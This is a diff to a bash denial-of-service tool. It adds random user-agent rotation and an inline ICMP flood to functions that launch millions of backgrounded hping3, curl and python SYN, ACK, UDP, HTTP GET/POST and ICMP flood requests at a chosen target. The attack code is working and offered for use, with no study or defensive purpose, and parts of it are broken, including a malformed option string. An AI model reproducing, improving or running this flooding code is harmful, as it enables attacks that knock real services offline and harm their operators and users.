@@ -94,8 +94,9 @@ syn_flood() {
     echo -e "${CYAN}[*] Starting TCP SYN flood attack on $target${RESET}"
     read_user_agents
     for ((i=0; i<7000000; i++)); do  # 7 million packets
+        random_ua=${user_agents[$RANDOM % ${#user_agents[@]}]}  # Random user agent
         # Increase packet size for higher traffic volume
-        python3 syn_flood.py -t $target -p $port --user-agent "$random_ua" -s 2048 > /dev/null 2>&1 &
+        python3 syn_flood.py -t $target -p $port -s 2048 > /dev/null 2>&1 &
     done
     wait
 }
@@ -106,8 +107,9 @@ ack_flood() {
     echo -e "${CYAN}[*] Starting TCP ACK flood attack on $target${RESET}"
     read_user_agents
     for ((i=0; i<7000000; i++)); do  # 7 million packets
+        random_ua=${user_agents[$RANDOM % ${#user_agents[@]}]}  # Random user agent
         # Use a larger packet size for higher traffic
-        hping3 -A -p $port -a $random_ua -d 2048 $target > /dev/null 2>&1 &
+        hping3 -A -p $port -d 2048 $target > /dev/null 2>&1 &
     done
     wait
 }
@@ -118,8 +120,9 @@ udp_flood() {
     echo -e "${CYAN}[*] Starting UDP flood attack on $target${RESET}"
     read_user_agents
     for ((i=0; i<7000000; i++)); do  # 7 million packets
+        random_ua=${user_agents[$RANDOM % ${#user_agents[@]}]}  # Random user agent
         # Increase packet size for higher traffic
-        hping3 --udp -p $port -a $random_ua -d 2048 $target > /dev/null 2>&1 &
+        hping3 --udp -p $port -d 2048 $target > /dev/null 2>&1 &
     done
     wait
 }
@@ -139,9 +142,11 @@ dns_flood() {
 http_flood() {
     target=$1
     echo -e "${CYAN}[*] Starting HTTP flood attack on $target${RESET}"
+    read_user_agents
     for ((i=0; i<7000000; i++)); do  # 7 million packets
+        random_ua=${user_agents[$RANDOM % ${#user_agents[@]}]}  # Random user agent
         # Larger HTTP GET request size for higher traffic
-        curl -s -X GET http://$target -H "User-Agent: RandomUA" --data "payload" > /dev/null 2>&1 &
+        curl -s -X GET http://$target -H "User-Agent: $random_ua" --data "payload" > /dev/null 2>&1 &
     done
     wait
 }
@@ -150,9 +155,11 @@ http_flood() {
 post_flood() {
     target=$1
     echo -e "${CYAN}[*] Starting HTTP POST flood attack on $target${RESET}"
+    read_user_agents
     for ((i=0; i<7000000; i++)); do  # 7 million packets
+        random_ua=${user_agents[$RANDOM % ${#user_agents[@]}]}  # Random user agent
         # Larger HTTP POST request size for higher traffic
-        curl -s -X POST http://$target --data "payload" > /dev/null 2>&1 &
+        curl -s -X POST http://$target --data "payload" -H "User-Agent: $random_ua" > /dev/null 2>&1 &
     done
     wait
 }
@@ -163,8 +170,15 @@ while getopts ":u:p:sirSAtf:n:Hvlp:s:seq:win:proto:P:l:t:FITLVM" option; do
         u) target="$OPTARG";;
         p) port="$OPTARG";;
         s) scan_ports "$target";;
-        i) http_icmp_flood "$target";;
-        r) retry_attack "$target";;
+        i) # ICMP Flood logic
+           echo -e "${CYAN}[*] Starting ICMP flood attack on $target${RESET}"
+           for ((i=0; i<7000000; i++)); do
+               hping3 --icmp -p $port $target > /dev/null 2>&1 &
+           done
+           wait;;
+        r) # Retry attack logic
+           echo -e "${CYAN}[*] Retrying attack on $target${RESET}"
+           retry_attack "$target";;
         S) syn_flood "$target";;
         A) ack_flood "$target";;
         U) udp_flood "$target";;
